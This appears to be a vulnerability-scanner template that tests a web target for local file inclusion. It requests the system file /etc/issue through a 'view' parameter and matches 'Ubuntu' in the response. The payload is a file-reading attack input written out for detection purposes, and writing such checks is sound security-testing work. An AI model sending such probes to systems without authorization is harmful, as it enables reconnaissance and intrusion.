id: lfi4-50
name: 'System file /etc/issue via view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/issue via view'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - '/etc/issue'
    matchers:
      - type: word
        part: body
        words:
          - 'Ubuntu'
